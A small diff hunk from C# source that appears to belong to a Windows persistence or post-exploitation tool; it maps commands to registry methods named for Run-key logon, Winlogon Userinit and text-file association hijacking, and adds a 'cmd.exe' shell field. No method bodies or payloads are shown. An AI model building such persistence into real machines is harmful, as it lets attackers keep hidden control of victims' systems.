@@ -70,6 +70,8 @@ class Info
         { "runlocaluser", (name) => Registrys.RunLogonUser(name) },
         { "wininit", (_) => Registrys.WinLogonUserInit() },
         { "txthijack", (_) => Registrys.PersistTxtfile() }
-    }; 
+    };
+
+    public static string MainShell = "cmd.exe";
 }
 
